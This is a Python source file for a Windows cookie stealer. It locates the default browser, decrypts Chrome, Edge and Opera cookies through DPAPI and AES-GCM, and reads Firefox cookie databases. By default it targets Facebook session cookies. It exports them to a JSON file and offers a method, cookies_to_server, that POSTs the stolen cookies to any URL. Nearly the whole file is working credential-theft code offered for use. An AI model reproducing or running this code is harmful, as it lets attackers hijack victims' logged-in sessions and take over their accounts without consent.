from http.cookiejar import CookieJar
import os
import re
import json
import logging
from requests.cookies import cookiejar_from_dict
from requests import post
import base64
import sqlite3
import configparser
import win32crypt
from winreg import OpenKey, HKEY_CURRENT_USER, QueryValueEx
from Cryptodome.Cipher import AES


# constants for CookieLogger class.
FORMATTER = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
NAME = "Logger"

# constants for CookiesExtractor class.
LOG_FILE = "cookie.log"
LOCAL_STATE_FILENAME = "Local State"
COOKIES_FILE_CHROMIUM = "Cookies"
SQLITE_QUERY_CHROMIUM = "SELECT host_key, name, value, encrypted_value FROM cookies"
COOKIES_FILE_FIREFOX = "cookies.sqlite"
SQLITE_QUERY_FIREFOX = "SELECT host, name, value FROM moz_cookies"
PROFILES_INI_FILE = "profiles.ini"

# default domain to search for
FACEBOOK_DOMAIN = ".facebook.com"


# returns the default browser used by the user that launces the script (Windows users).
def get_browser() -> str:
    with OpenKey(HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice") as key:
        value = QueryValueEx(key, "Progid")[0]

    value_lower = value.lower()
    if "chrome" in value_lower or "chrome" == value_lower:
        return "chrome"

    elif "edge" in value_lower or "edge" == value_lower:
        return "edge"

    elif "opera" in value_lower or "opera" == value_lower:
        return "opera"

    elif "firefox" in value_lower or "firefox" == value_lower:
        return "firefox"



# custom logger class.
class CookieLogger:
    def __init__(self) -> None:
        downloads = os.path.expanduser("~/Downloads")
        filepath = os.path.join(downloads, LOG_FILE)
        handler = logging.FileHandler(filepath)
        handler.setFormatter(FORMATTER)
        self.__logger = logging.getLogger(NAME)
        self.__logger.setLevel(logging.DEBUG)
        self.__logger.addHandler(handler)


    def log(self, message:str, level=1):
        
        if level == 1:
            self.__logger.debug(message)
        
        elif level == 2:
            self.__logger.info(message)
        
        elif level == 3:
            self.__logger.warning(message)
        
        elif level == 4:
            self.__logger.error(message)
        
        else:
            self.__logger.critical(message)


class CookiesExtractor():
    def __init__(self, browser: str=None, host_domain: str=FACEBOOK_DOMAIN) -> None:
        self.__cookies = []      
        self.__logger = CookieLogger()
        
        if browser == "chrome" or browser == "edge" or browser == "opera" or browser == "firefox":
            self.__browser = browser

        else:
            self.__browser = get_browser() 

        # regex to match the domain names and the cookies names.
        self.__host_domain = re.compile(host_domain)
        self.__name_reg = re.compile(".*")


    # setter method
    def __set_cookies(self, cookies: list) -> None:
        self.__cookies = cookies


    # returns either None or the path of the local state file.
    def __get_local_state_path(self, path: str) -> str or None:
        
        self.__logger.log("Finding the \"Local State\" file.", 2)
        
        # defining the state path.
        state_path = os.path.join(path, LOCAL_STATE_FILENAME)

        # file not exists
        if not os.path.exists(state_path):
            self.__logger.log("\"Local State\" file not found.", 4)
            
            return None
        
        return state_path


    # returns either None or the content of in json format of the local state file.
    def __get_local_state_content(self, state_path: str) -> str or None:
        
        if state_path is None:
            return None 
        
        # at this point, local state file exists. read content.
        content = None

        self.__logger.log("Extract content from \"Local State\".", 2)
        try:
            with open(state_path, "r") as f:
                content = json.loads(f.read())
                self.__logger.log("Content extracted.", 2)

        except Exception as e:
            self.__logger.log("Unable to complete reading action. Details:\n" + str(e), 4)
            return None
        
        return content


    # either returns None or the encryption key from the local state content.
    # works with chrome edge and opera.
    def __get_encryption_key(self, content: str) -> bytes or None:
        
        if content is None:
            return None
        
        # at this point, content is not None. retrieve key.
        encryption_key = None

        self.__logger.log("Getting the encryption key.", 2)
        try:
            encryption_key = base64.b64decode(content["os_crypt"]["encrypted_key"])
            encryption_key = encryption_key[5:]
            encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

            self.__logger.log("Got encryption key.", 2)

        except Exception as e:
            self.__logger.log("Unable to get the encryption key. Details:\n" + str(e), 4)
            return None

        return encryption_key


    # returns either None or a dictionary containing the info used in chromium browsers, that is the profiles and the encryption key.
    # in case of Opera, returns a dictionary containing only the encryption key.
    def __get_chromium_local_state(self, path: str) -> dict or None:
        state_path = self.__get_local_state_path(path)

        if state_path is None:
            return None 
        
        # file exists. get the content.
        content = self.__get_local_state_content(state_path)
        
        if content is None:
            return None 
        
        # content exists. get the key.
        encryption_key = self.__get_encryption_key(content)
        
        if encryption_key is None:
            return None 

        # check the browser instance
        # opera browser does not handle multiple profiles (until now). return the key.
        if self.__browser == "opera":
            new_dict = { "encryption_key": encryption_key } 
            return new_dict
        
        # for chrome ed edge. 
        # get the profiles.
        profiles = []
        self.__logger.log("Getting profiles.", 2)

        # for chrome.
        if self.__browser == "chrome":
            try:
                # for each profile.
                for name in content["profile"]["info_cache"]:

                    # check if cookie file exists.
                    # chrome has cookies file in /AppData/Local/Google/Chrome/User Data/{name}/Network.
                    if os.path.exists(os.path.join(path, name, "Network", COOKIES_FILE_CHROMIUM)):

                        # add profile to the list.
                        profiles.append(name)
                        self.__logger.log("Got profile.", 2)

            except Exception as e:
                self.__logger.log("Unable to get profiles. Details:\n" + str(e), 4)
                return None

        # for edge.
        elif self.__browser == "edge":
            try:
                # for each profile.
                for name in content["profile"]["info_cache"]:

                    # check if cookie file exists.
                    # edge has cookies file in /AppData/Local/Microsoft/Edge/User Data/{name}.
                    if os.path.exists(os.path.join(path, name, COOKIES_FILE_CHROMIUM)):

                        # add profile to the list.
                        profiles.append(name)
                        self.__logger.log("Got profile.", 2)

            except Exception as e:
                self.__logger.log("Unable to get profiles. Details:\n" + str(e), 4)
                return None

        new_dict = {
            "profiles": profiles,
            "encryption_key": encryption_key
        }

        return new_dict


    # either returns None or a dictionary containing a list of the profiles used by Firefox.
    def __get_firefox_local_profile_info(self, path: str) -> dict or None:

        self.__logger.log("Finding the \"profiles.ini\" file.", 2)
        
        # defining the profiles.ini path.
        profiles_ini_path = os.path.join(path, PROFILES_INI_FILE)

        # file not exists.
        if not os.path.exists(profiles_ini_path):
            self.__logger.log("\"profiles.ini\" file not found.", 4)
            return None
        
        # file exists. get content.
        config = configparser.ConfigParser()
        config.read(profiles_ini_path)

        self.__logger.log("Check if \"profiles.ini\" file is ok.", 2)

        # check if it's empty.
        if not config:
            self.__logger.log("\"profiles.ini\" file is empty or not exists.", 4)
            return None

        # it's ok.
        # extract profiles.
        profiles = []

        try:
            self.__logger.log("Reading profiles in \"profiles.ini\" file.", 2)
            
            # for each profile
            for profile in config:

                # for each key-value pairs
                for key, value in config.items(profile):
                    
                    if key == "path":
                        # get value characters starting by index 9.
                        # value pattern is "Profiles/{profile_name}" 
                        cookies_path = os.path.join(path, "Profiles", value[9:], COOKIES_FILE_FIREFOX)

                        if os.path.exists(cookies_path):
                            
                            temp_dict = {
                                "profile": profile,
                                "path": value[9:]
                            }

                            # add profile.
                            profiles.append(temp_dict)
                            self.__logger.log("Profile added.", 2)

        except Exception as e:
            self.__logger.log("Error while reading the profiles in \"profiles.ini\" file. Details:\n" + str(e), 4)
            return None
        
        return { "profiles": profiles }
        

    # returns either an empty dictionary or a dictionary containing the cookies names and their respective values, for chromium browsers (chrome, edge, opera).
    def __get_chromium_cookies(self, path: str, encryption_key: bytes) -> dict:
        self.__logger.log("Finding cookies file.", 2)

        # generate path for cookie file.
        path_cookies = os.path.join(path, COOKIES_FILE_CHROMIUM)

        # check if cookies file exist.
        if not os.path.exists(path_cookies):
            self.__logger.log("Cookies file not found.", 4)
            return {}
 
        # cookie file exists. connect to sqlite database.
        try:            
            self.__logger.log("Connecting to DB.", 2)
            conn = sqlite3.connect(path_cookies)
            conn.text_factory = bytes
            cursor = conn.cursor()
        
        except Exception as e:
            self.__logger.log("Error connecting to DB. Details:\n" + str(e), 4)
            return {}

        self.__logger.log("Connection established.", 2)

        # connection established. get cookies.
        cookies = {}

        try:
            # get the cookies from database
            self.__logger.log("Trying to read cookies.", 2)
            cursor.execute(SQLITE_QUERY_CHROMIUM)
        
        except Exception as e:
            self.__logger.log("Error while reading. Details:\n" + str(e), 2)
            return {}

        # for each cookie
        for host_key, name, value, encrypted_value in cursor.fetchall():
            
            # decode host and name.
            host_key = host_key.decode("utf-8")
            name = name.decode("utf-8")

            # check regex.
            if self.__host_domain.match(host_key) and self.__name_reg.match(name):

                value = None

                # decrypt the values.
                try:

                    # decrypt with AES.
                    self.__logger.log("Trying to decrypt cookies (new method).", 2)
                    
                    nonce = encrypted_value[3:3+12]
                    cipher_text = encrypted_value[3+12:-16]
                    auth_tag = encrypted_value[-16:]
                    
                    cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
                    value = cipher.decrypt_and_verify(cipher_text, auth_tag)
                
                except Exception as e:

                    # decrypt with the old method.
                    self.__logger.log("Trying to decrypt cookies (old method).", 2)
                    value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1] or value or 0

                
                if value is None or value == 0:
                    return {}
                
                # value extracted
                value = value.decode("utf-8")

                # adding cookies.
                cookies[name] = value
                self.__logger.log("Cookie added", 2)

        # close database.
        conn.close()

        return cookies


    # returns either an empty dictionary or a dictionary containing the cookies names and their respective values, for the firefox browser.
    def __get_firefox_cookies(self, path: str) -> dict:
        self.__logger.log("Finding cookies file.", 2)

        # generate path for cookie file.
        path_cookies = os.path.join(path, COOKIES_FILE_FIREFOX)

        # check if cookies file exist.
        if not os.path.exists(path_cookies):
            self.__logger.log("Cookies file not found.", 4)
            return {}
        
        # cookie file exists. connect to sqlite database.
        try:            
            self.__logger.log("Connecting to DB.", 2)
            conn = sqlite3.connect(path_cookies)
            cursor = conn.cursor()
        
        except Exception as e:
            self.__logger.log("Error connecting to DB. Details:\n" + str(e), 4)
            return {}

        self.__logger.log("Connection established.", 2)

        # connection established. get cookies.
        cookies = {}

        try:
            # get cookies from database.
            self.__logger.log("Trying to read cookies.", 2)
            cursor.execute(SQLITE_QUERY_FIREFOX)
        
        except Exception as e:
            self.__logger.log("Error while reading. Details:\n" + str(e), 2)
            return {}

        # for each cookie.
        for host, name, value in cursor.fetchall():
            
            # check regex
            if self.__host_domain.match(host) and self.__name_reg.match(name):
                
                # adding cookies.
                cookies[name] = value
                self.__logger.log("Cookie added", 2)

        # close database.
        conn.close()

        return cookies

    
    # either returns None or a dictionary containing the info about Chrome and its cookies.
    def __browser_chrome(self) -> None:

        self.__logger.log("Finding Chrome installation default folder", 2)

        # path of Chrome is /AppData/Local/Google/Chrome/User Data.
        path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data")

        # if folder was not found return None.
        if not os.path.exists(path):
            self.__logger.log("Chrome installation default folder not found", 4)
            return

        # folder is found. get the local state info.
        info = self.__get_chromium_local_state(path)

        if not info:
            return

        # info extracted. get cookies for each profile.
        cookies = []

        for profile in info["profiles"]:

            # path of cookies is /AppData/Local/Google/Chrome/User Data/{name}/Network.
            cookies_path = os.path.join(path, profile, "Network")
            temp_cookies = self.__get_chromium_cookies(cookies_path, info["encryption_key"])
            
            temp_dict = {
                "profile": profile,
                "cookies": temp_cookies
            }

            cookies.append(temp_dict) 

        self.__set_cookies(cookies)
        

    # either returns an None or a dictionary containint the info about Edge and its cookies.
    def __browser_edge(self) -> None:

        self.__logger.log("Finding Edge installation default folder", 2)

        # path of Edge is /AppData/Local/Microsft/Edge/User Data.
        path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data")

        # if folder was not found return None.
        if not os.path.exists(path):
            self.__logger.log("Edge installation default folder not found", 4)
            return

        # folder is found. get the local state info.
        info = self.__get_chromium_local_state(path)

        if not info:
            return

        # info extracted. get cookies for each profile.
        cookies = []

        for profile in info["profiles"]:

            # path of cookies is /AppData/Local/Microsft/Edge/User Data/{name}.
            cookies_path = os.path.join(path, profile)
            temp_cookies = self.__get_chromium_cookies(cookies_path, info["encryption_key"])

            temp_dict = {
                "profile": profile,
                "cookies": temp_cookies
            }

            cookies.append(temp_dict)

        self.__set_cookies(cookies)


    # either returns an None or a dictionary containing the info about Opera and its cookies.
    def __browser_opera(self) -> None:

        self.__logger.log("Finding Opera installation default folder", 2)

        # path of Opera is AppData\Roaming\Opera Software\Opera Stable.
        path = os.path.join(os.getenv("APPDATA"), "..", "Roaming", "Opera Software", "Opera Stable")

        # if folder was not found return None.
        if not os.path.exists(path):
            self.__logger.log("Opera installation default folder not found", 4)
            return

        # folder is found. get the local state info.
        info = self.__get_chromium_local_state(path)

        if not info:
            return

        # info extracted. get cookies for each profile.
        cookies = []

        # Opera does not have profiles. call directly the function with the key.
        # path of cookies is the same of the above.
        temp_cookies = self.__get_chromium_cookies(path, info["encryption_key"])
        temp_dict = { "cookies": temp_cookies }
        
        cookies.append(temp_dict)

        self.__set_cookies(cookies)   


    # wrapper function for chromium browsers
    def __browser_chromium(self) -> None:

        if self.__browser == "chrome":
            self.__browser_chrome()

        elif self.__browser == "edge":
            self.__browser_edge()

        else:
            self.__browser_opera()


    def __browser_mozilla(self) -> None:

        self.__logger.log("Finding Firefox installation default folder", 2)

        # path of Firefox is AppData\Roaming\Mozilla\Firefox.
        path = os.path.join(os.getenv("APPDATA"), "..", "Roaming", "Mozilla", "Firefox")

        # if folder was not found return None.
        if not os.path.exists(path):
            self.__logger.log("Firefox installation default folder not found", 4)
            return

        # folder is found. get the local state info.
        info = self.__get_firefox_local_profile_info(path)

        if not info:
            return

        # info extracted. get cookies for each profile.
        cookies = []

        # for each profile
        for profile in info["profiles"]:
            
            # cookies file location.
            cookies_path = os.path.join(path, "Profiles", profile["path"])

            temp_cookies = self.__get_firefox_cookies(cookies_path)
            
            temp_dict = {
                "profile": profile["profile"],
                "cookies": temp_cookies
            }

            cookies.append(temp_dict)

        self.__set_cookies(cookies)


    # function to call for init cookies
    def load(self):
        self.__logger.log("Loading {:s} cookies.".format(self.__browser.capitalize()), 2)
        if self.__browser == "firefox":
            self.__browser_mozilla()
        else:
            self.__browser_chromium()


    # write cookies on file located in download folder. otherwise write an empty file.
    def cookies_to_file(self) -> None:
        downloads = os.path.expanduser("~/Downloads")
        filename = "{:s}_cookies.json".format(self.__browser)
        filepath = os.path.join(downloads, filename)

        with open (filepath, "w") as f:
            json.dump(self.__cookies, f, indent=4)


    # returns a json formatted string of cookies.
    def cookies_to_json(self) -> str:
        return json.dumps(self.__cookies, indent=4)


    # send cookies to server url
    def cookies_to_server(self, url) -> None:
        self.__logger.log("Sending the POST request", 2)
        post(url, json=self.__cookies)
            

    # this functions can return: 
    # 1. a single cookiejar.
    # 2. a list of cookiejars, depending on how many profiles are used by the browser.
    # 3. an empty cookiejar
    def cookies_to_cookiejar(self) -> CookieJar or list[CookieJar]:
        if len(self.__cookies) == 0:
            return CookieJar()
        
        elif len(self.__cookies) == 1:
            return cookiejar_from_dict(self.__cookies[0]["cookies"])
        
        else:
            jars = []

            for el in self.__cookies:
                temp_jar = cookiejar_from_dict(el["cookies"])
                jars.append(temp_jar)
            
            return jars


# example
if __name__ == "__main__":
    # mandatory
    ce = CookiesExtractor()
    
    # mandatory
    ce.load()

    # optional. you can do whatever you want with cookies:
    # 1. ce.cookies_to_file()
    # 2. ce.cookies_to_json()
    # 3. ce.cookies_to_server()
    # or all of the above.
    ce.cookies_to_file()